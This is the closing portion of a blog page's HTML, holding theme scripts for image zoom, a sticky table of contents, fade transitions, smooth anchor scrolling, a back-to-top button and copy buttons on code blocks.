<script src="/js/medium-zoom.min.js" data-no-instant></script>

<script>
    const images = Array.from(document.querySelectorAll(".post-content img"));
    images.forEach(img => {
        mediumZoom(img, {
            margin: 10,  
            background: '#1c1c1ff2',  
            scrollOffset: 20,  
            container: null,  
            template: null  
        });
    });
</script><script>
    const toc = document.querySelector('.toc')

    window.addEventListener('scroll', function () {
        if (window.scrollY > 70) {
            toc.style.top = '2.5rem'
        } else {
            toc.style.top = '11.6rem'
        }
    })
</script><script>
    class Scroller {
        static init() {
            if (document.querySelector('.toc')) { 
                this.toc = document.querySelectorAll('.toc a');
                this.toc.forEach(link => link.classList.add('transition', 'duration-200'))
                this.headers = Array.from(this.toc).map(link => {
                    return document.querySelector(`#${link.href.split('#')[1]}`);
                })
                this.ticking = false;
                window.addEventListener('scroll', (e) => {
                    this.onScroll()
                })
            }
        }

        static onScroll() {
            if (!this.ticking) {
                requestAnimationFrame(this.update.bind(this));
                this.ticking = true;
            }
        }

        static update() {
            this.activeHeader ||= this.headers[0];
            let activeIndex = this.headers.findIndex((header) => {
                return header.getBoundingClientRect().top > 180;
            });
            if (activeIndex == -1) {
                activeIndex = this.headers.length - 1;
            } else if (activeIndex > 0) {
                activeIndex--;
            }
            let active = this.headers[activeIndex];
            if (active !== this.activeHeader) {
                this.activeHeader = active;
                this.toc.forEach(link => link.classList.remove('toc-active'));
                this.toc[activeIndex].classList.add('toc-active');
            }
            this.ticking = false;
        }
    }

    document.addEventListener('DOMContentLoaded', function (e) {
        Scroller.init();
    })
</script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        const elementToFade = document.querySelectorAll(".main");

        
        setTimeout(function () {
            elementToFade.forEach(function (element) {
                element.style.transition = "opacity 0.3s ease-out";
                element.style.opacity = 1;
            });
        }, 50);

        
        window.addEventListener("beforeunload", function () {
            elementToFade.forEach(function (element) {
                setTimeout(function () {
                    element.style.transition = "opacity 0.5s ease-in";
                    element.style.opacity = 0;
                }, 10);
            });
        });

    });
</script>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
